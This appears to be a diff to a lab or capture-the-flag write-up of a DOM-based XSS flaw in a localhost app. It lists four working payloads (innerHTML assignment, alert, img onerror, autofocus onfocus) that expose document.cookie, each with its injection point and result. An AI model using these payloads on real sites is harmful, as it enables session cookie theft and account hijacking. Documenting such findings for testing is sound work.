@@ -3,7 +3,9 @@
 ## vulnerability analysis
 
 **target application**: `http://localhost:8000/`
+
 **vulnerability type**: dom-based xss
+
 **attack vector**: form input field with insufficient sanitization
 
 ## successful payloads
@@ -11,30 +13,43 @@
 ### 1. direct DOM Manipulation
 
 **payload**: `document.getElementById('cookieOutput').innerHTML = 'Cookie value: '+document.cookie`
+
 **payload**: `alert(document.cookie)`
+
 **injection point**: text input field
+
 **execution context**: script element creation
+
 **result**: successfully displays cookie content "Cookie value: ftcookies=if_you_see_me_its_win"
 
 ### 2. direct javascript execution
 
 **payload**: `alert(document.cookie)`
+
 **injection point**: text input field
+
 **execution context**: script element creation
+
 **result**: open a popup and successfully displays cookie content "ftcookies=if_you_see_me_its_win"
 
 ### 3. event handler exploitation
 
 **payload**: `<img src=x onerror=alert(document.cookie)>`
+
 **injection point**: text input field via innerhtml
+
 **execution context**: image load error event
+
 **result**: open a popup and successfully displays cookie content "ftcookies=if_you_see_me_its_win"
 
 ### 5. input focus-based payload
 
 **payload**: `<input onfocus=alert(document.cookie) autofocus>`
+
 **injection point**: text input field via innerhtml
+
 **execution context**: automatic focus event
+
 **result**: create a input text that display a popup and successfully display cookie content "ftcookies=if_you_see_me_its_win"
 
 ## technical analysis
